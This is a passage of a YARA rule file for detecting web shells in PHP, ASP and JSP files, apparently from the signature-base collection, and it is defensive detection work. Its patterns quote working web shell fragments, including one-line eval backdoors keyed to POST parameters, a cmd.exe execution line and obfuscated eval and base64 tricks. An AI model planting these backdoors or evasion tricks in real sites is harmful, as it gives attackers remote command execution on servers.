        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_payload
        $asp_payload0  = "eval_r" fullword nocase wide ascii
        $asp_payload1  = /\beval\s/ nocase wide ascii
        $asp_payload2  = /\beval\(/ nocase wide ascii
        $asp_payload3  = /\beval\"\"/ nocase wide ascii
        // var Fla = {'E':eval};  Fla.E(code)
        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
        $asp_multi_payload_one2 = "addcode" fullword wide ascii
        $asp_multi_payload_one3 = /\.run\b/ wide ascii
        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
        $asp_multi_payload_three2 = "Process" fullword wide ascii
        $asp_multi_payload_three3 = ".Start" wide ascii
        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii

        // execute cmd.exe /c with arguments using ProcessStartInfo
        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
        $asp_multi_payload_five2 = ".Start" nocase wide ascii
        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii


        //strings from private rule capa_asp_write_file
        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
        $asp_always_write1 = /\.write/ nocase wide ascii
        $asp_always_write2 = /\.swrite/ nocase wide ascii
        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
        $asp_cr_write1 = "CreateObject(" nocase wide ascii
        $asp_cr_write2 = "CreateObject (" nocase wide ascii
        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
        $asp_streamwriter2 = "filestream" fullword nocase wide ascii

    condition:
        // reduce fp
        //any of them or
        filesize < 5MB and
        // also check for GIF8 at 0x3 because some folks write their webshell in a text editor and have a BOM in front of GIF8 (which probably wouldn't be a valif GIF anymore :)
        ( $png at 0 or $jpg at 0 or $gif at 0 or $gif at 3 or $gif2 at 0 or $gif2 at 3 or $gif3 at 0 or $mdb at 0 ) and
        ( ( (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and
        ( (
            any of ( $cpayload* ) or
        all of ( $m_cpayload_preg_filter* )
        )
        or (
        any of ( $php_write* ) or
        all of ( $php_multi_write* )
        )
        ) ) or
        ( (
            any of ( $cjsp* )
        )
        and (
        1 of ( $payload* ) or
        all of ( $rt_payload* )
        )
        ) or
        ( (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and
        ( (
            any of ( $asp_payload* ) or
        all of ( $asp_multi_payload_one* ) or
        all of ( $asp_multi_payload_two* ) or
        all of ( $asp_multi_payload_three* ) or
        all of ( $asp_multi_payload_four* ) or
        all of ( $asp_multi_payload_five* )
        )
        or (
        any of ( $asp_always_write* ) and
        (
            any of ( $asp_write_way_one* ) and
            any of ( $asp_cr_write* )
        ) or (
            any of ( $asp_streamwriter* )
        )
        )
        ) ) )
}

rule WEBSHELL_Mixed_OBFUSC {
   meta:
      description = "Detects webshell with mixed obfuscation commands"
      author = "Arnim Rupp (https://github.com/ruppde)"
      reference = "Internal Research"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      date = "2023-01-28"
      modified = "2023-04-05"
      hash1 = "8c4e5c6bdfcc86fa27bdfb075a7c9a769423ec6d53b73c80cbc71a6f8dd5aace"
      hash2 = "78f2086b6308315f5f0795aeaa75544128f14889a794205f5fc97d7ca639335b"
      hash3 = "3bca764d44074820618e1c831449168f220121698a7c82e9909f8eab2e297cbd"
      hash4 = "b26b5e5cba45482f486ff7c75b54c90b7d1957fd8e272ddb4b2488ec65a2936e"
      hash5 = "e217be2c533bfddbbdb6dc6a628e0d8756a217c3ddc083894e07fd3a7408756c"
      score = 50
      id = "dcb4054b-0c87-5cd0-9297-7fd5f2e37437"
   strings:
      $s1 = "rawurldecode/*" ascii
      $s2 = "preg_replace/*" ascii
      $s3 = " __FILE__/*" ascii
      $s4 = "strlen/*" ascii
      $s5 = "str_repeat/*" ascii
      $s6 = "basename/*" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 4 of them ))
}

rule WEBSHELL_Cookie_Post_Obfuscation {
    meta:
        description = "Detects webshell using cookie POST"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2023-01-28"
        modified = "2023-04-05"
        license = "https://github.com/SigmaHQ/Detection-Rule-License/blob/main/LICENSE.Detection.Rules.md"
        hash = "d08a00e56feb78b7f6599bad6b9b1d8626ce9a6ea1dfdc038358f4c74e6f65c9"
        hash = "2ce5c4d31682a5a59b665905a6f698c280451117e4aa3aee11523472688edb31"
        hash = "ff732d91a93dfd1612aed24bbb4d13edb0ab224d874f622943aaeeed4356c662"
        hash = "a3b64e9e065602d2863fcab641c75f5d8ec67c8632db0f78ca33ded0f4cea257"
        hash = "d41abce305b0dc9bd3a9feb0b6b35e8e39db9e75efb055d0b1205a9f0c89128e"
        hash = "333560bdc876fb0186fae97a58c27dd68123be875d510f46098fc5a61615f124"
        hash = "2efdb79cdde9396ff3dd567db8876607577718db692adf641f595626ef64d3a4"
        hash = "e1bd3be0cf525a0d61bf8c18e3ffaf3330c1c27c861aede486fd0f1b6930f69a"
        hash = "f8cdedd21b2cc29497896ec5b6e5863cd67cc1a798d929fd32cdbb654a69168a"

        id = "cc5ded80-5e58-5b25-86d1-1c492042c740"
    strings:
        $s1 = "]($_COOKIE, $_POST) as $"
        $s2 = "function"
        $s3 = "Array"
    condition:
    ( uint16(0) == 0x3f3c and filesize < 100KB and ( all of them ))
}
/* 
	Webshell rules that use external variables for false positive filtering
*/

rule webshell_php_by_string_obfuscation : FILE {
	meta:
		description = "PHP file containing obfuscation strings. Might be legitimate code obfuscated for whatever reasons, a webshell or can be used to insert malicious Javascript for credit card skimming"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Arnim Rupp"
		date = "2021/01/09"
		modified = "2022-10-25"
		hash = "e4a15637c90e8eabcbdc748366ae55996dbec926382220c423e754bd819d22bc"
		id = "be890bf6-de7e-588e-b5cd-72e8081d0b9c"
	strings:
		$opbs13 = "{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}" wide ascii
		$opbs14 = "/*-/*-*/\"" wide ascii
		$opbs16 = "'ev'.'al'" wide ascii
		$opbs17 = "'e'.'val'" wide ascii
		$opbs18 = "e'.'v'.'a'.'l" wide ascii
		$opbs19 = "bas'.'e6'." wide ascii
		$opbs20 = "ba'.'se6'." wide ascii
		$opbs21 = "as'.'e'.'6'" wide ascii
		$opbs22 = "gz'.'inf'." wide ascii
		$opbs23 = "gz'.'un'.'c" wide ascii
		$opbs24 = "e'.'co'.'d" wide ascii
		$opbs25 = "cr\".\"eat" wide ascii
		$opbs26 = "un\".\"ct" wide ascii
		$opbs27 = "'c'.'h'.'r'" wide ascii
		$opbs28 = "\"ht\".\"tp\".\":/\"" wide ascii
		$opbs29 = "\"ht\".\"tp\".\"s:" wide ascii
		$opbs31 = "'ev'.'al'" nocase wide ascii
		$opbs32 = "eval/*" nocase wide ascii
		$opbs33 = "eval(/*" nocase wide ascii
		$opbs34 = "eval(\"/*" nocase wide ascii
		$opbs36 = "assert/*" nocase wide ascii
		$opbs37 = "assert(/*" nocase wide ascii
		$opbs38 = "assert(\"/*" nocase wide ascii
		$opbs40 = "'ass'.'ert'" nocase wide ascii
		$opbs41 = "${'_'.$_}['_'](${'_'.$_}['__'])" wide ascii
		$opbs44 = "'s'.'s'.'e'.'r'.'t'" nocase wide ascii
		$opbs45 = "'P'.'O'.'S'.'T'" wide ascii
		$opbs46 = "'G'.'E'.'T'" wide ascii
		$opbs47 = "'R'.'E'.'Q'.'U'" wide ascii
		$opbs48 = "se'.(32*2)" nocase
		$opbs49 = "'s'.'t'.'r_'" nocase
		$opbs50 = "'ro'.'t13'" nocase
		$opbs51 = "c'.'od'.'e" nocase
		$opbs53 = "e'. 128/2 .'_' .'d"
        // move malicious code out of sight if line wrapping not enabled
		$opbs54 = "<?php                                                                                                                                                                                " //here I end
		$opbs55 = "=chr(99).chr(104).chr(114);$_"
		$opbs56 = "\\x47LOBAL"
		$opbs57 = "pay\".\"load"
		$opbs58 = "bas'.'e64"
		$opbs59 = "dec'.'ode"
		$opbs60 = "fla'.'te"
        // rot13 of eval($_POST
		$opbs70 = "riny($_CBFG["
		$opbs71 = "riny($_TRG["
		$opbs72 = "riny($_ERDHRFG["
		$opbs73 = "eval(str_rot13("
		$opbs74 = "\"p\".\"r\".\"e\".\"g\""
		$opbs75 = "$_'.'GET"
		$opbs76 = "'ev'.'al("
        // eval( in hex
		$opbs77 = "\\x65\\x76\\x61\\x6c\\x28" wide ascii nocase

		//strings from private rule capa_php_old_safe
		$php_short = "<?" wide ascii
		// prevent xml and asp from hitting with the short tag
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"

		// of course the new tags should also match
        // already matched by "<?"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

		$fp1 = "NanoSpell TinyMCE Spellchecker for PHP" ascii fullword
	condition:
		filesize < 500KB and (
			(
				(
						$php_short in (0..100) or
						$php_short in (filesize-1000..filesize)
				)
				and not any of ( $no_* )
			)
			or any of ( $php_new* )
		)
		and any of ( $opbs* )
		and not 1 of ($fp*)
}
/*

   THOR APT Scanner - Web Shells Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner

   Florian Roth
   Nextron Systems GmbH

   revision: 20160115

*/

rule Weevely_Webshell {
	meta:
		description = "Weevely Webshell - Generic Rule - heavily scrambled tiny web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html"
		date = "2014/12/14"
		score = 60
		id = "12aa177a-4ebc-5ed8-a81b-34ec83395ec4"
	strings:
		$s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
		$s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
		$s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
		$s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
	condition:
		uint32(0) == 0x68703f3c and all of ($s*) and filesize > 570 and filesize < 800
}

rule webshell_h4ntu_shell_powered_by_tsoi_ {
	meta:
		description = "Web Shell - file h4ntu shell powered by tsoi.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "06ed0b2398f8096f1bebf092d0526137"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
		$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
		$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
		$s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
	condition:
		all of them
}
rule webshell_PHP_sql {
	meta:
		description = "Web Shell - file sql.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "2cf20a207695bbc2311a998d1d795c35"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
		$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
	condition:
		all of them
}
rule webshell_PHP_a {
	meta:
		description = "Web Shell - file a.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "e3b461f7464d81f5022419d87315a90d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
		$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
		$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
	condition:
		2 of them
}
rule webshell_iMHaPFtp_2 {
	meta:
		description = "Web Shell - file iMHaPFtp.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "12911b73bc6a5d313b494102abcf5c57"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
		$s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"
	condition:
		1 of them
}
rule webshell_Jspspyweb {
	meta:
		description = "Web Shell - file Jspspyweb.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "4e9be07e95fff820a9299f3fb4ace059"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
		$s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"
	condition:
		all of them
}
rule webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2 {
	meta:
		description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "49ad9117c96419c35987aaa7e2230f63"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
		$s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"
	condition:
		1 of them
}
rule webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend {
	meta:
		description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
		$s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
	condition:
		1 of them
}
rule webshell_phpshell_2_1_pwhash {
	meta:
		description = "Web Shell - file pwhash.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "ba120abac165a5a30044428fac1970d8"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
		$s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","
	condition:
		1 of them
}
rule webshell_PHPRemoteView {
	meta:
		description = "Web Shell - file PHPRemoteView.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
	condition:
		1 of them
}
rule webshell_jsp_12302 {
	meta:
		description = "Web Shell - file 12302.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a3930518ea57d899457a62f372205f7f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
		$s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
	condition:
		all of them
}
rule webshell_caidao_shell_guo {
	meta:
		description = "Web Shell - file guo.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "9e69a8f499c660ee0b4796af14dc08f0"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php ($www= $_POST['ice'])!"
		$s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"
	condition:
		1 of them
}
rule webshell_PHP_redcod {
	meta:
		description = "Web Shell - file redcod.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "5c1c8120d82f46ff9d813fbe3354bac5"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
		$s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
	condition:
		all of them
}
rule webshell_remview_fix {
	meta:
		description = "Web Shell - file remview_fix.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a24b7c492f5f00e2a19b0fa2eb9c3697"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
		$s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"
	condition:
		1 of them
}
rule webshell_asp_cmd {
	meta:
		description = "Web Shell - file cmd.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "895ca846858c315a3ff8daa7c55b3119"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
	condition:
		1 of them
}
rule webshell_php_sh_server {
	meta:
		description = "Web Shell - file server.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 50
		hash = "d87b019e74064aa90e2bb143e5e16cfa"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "eval(getenv('HTTP_CODE'));" fullword
	condition:
		all of them
}
rule webshell_PH_Vayv_PH_Vayv {
	meta:
		description = "Web Shell - file PH Vayv.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "35fb37f3c806718545d97c6559abd262"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
		$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
	condition:
		1 of them
}
rule webshell_caidao_shell_ice {
	meta:
		description = "Web Shell - file ice.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "6560b436d3d3bb75e2ef3f032151d139"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%eval request(\"ice\")%>" fullword
	condition:
		all of them
}
rule webshell_cihshell_fix {
	meta:
		description = "Web Shell - file cihshell_fix.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "3823ac218032549b86ee7c26f10c4cb5"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
		$s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"
	condition:
		1 of them
}
rule webshell_asp_shell {
	meta:
		description = "Web Shell - file shell.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "e63f5a96570e1faf4c7b8ca6df750237"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
		$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
	condition:
		all of them
}
rule webshell_Private_i3lue {
	meta:
		description = "Web Shell - file Private-i3lue.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "13f5c7a035ecce5f9f380967cf9d4e92"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s8 = "case 15: $image .= \"\\21\\0\\"
	condition:
		all of them
}
rule webshell_php_up {
	meta:
		description = "Web Shell - file up.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "7edefb8bd0876c41906f4b39b52cd0ef"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
		$s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
		$s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
	condition:
		2 of them
}
rule webshell_Mysql_interface_v1_0 {
	meta:
		description = "Web Shell - file Mysql interface v1.0.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a12fc0a3d31e2f89727b9678148cd487"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
	condition:
		all of them
}
rule webshell_php_s_u {
	meta:
		description = "Web Shell - file s-u.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
	condition:
		all of them
}
rule webshell_phpshell_2_1_config {
	meta:
		description = "Web Shell - file config.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "bd83144a649c5cc21ac41b505a36a8f3"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
	condition:
		all of them
}
rule webshell_asp_EFSO_2 {
	meta:
		description = "Web Shell - file EFSO_2.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
	condition:
		all of them
}
rule webshell_jsp_up {
	meta:
		description = "Web Shell - file up.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "515a5dd86fe48f673b72422cccf5a585"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
	condition:
		all of them
}
rule webshell_NetworkFileManagerPHP {
	meta:
		description = "Web Shell - file NetworkFileManagerPHP.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "acdbba993a5a4186fd864c5e4ea0ba4f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
	condition:
		all of them
}
rule webshell_Server_Variables {
	meta:
		description = "Web Shell - file Server Variables.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "47fb8a647e441488b30f92b4d39003d7"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
		$s9 = "Variable Name</B></font></p>" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_ice_2 {
	meta:
		description = "Web Shell - file ice.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "1d6335247f58e0a5b03e17977888f5f2"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_mdb {
	meta:
		description = "Web Shell - file mdb.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
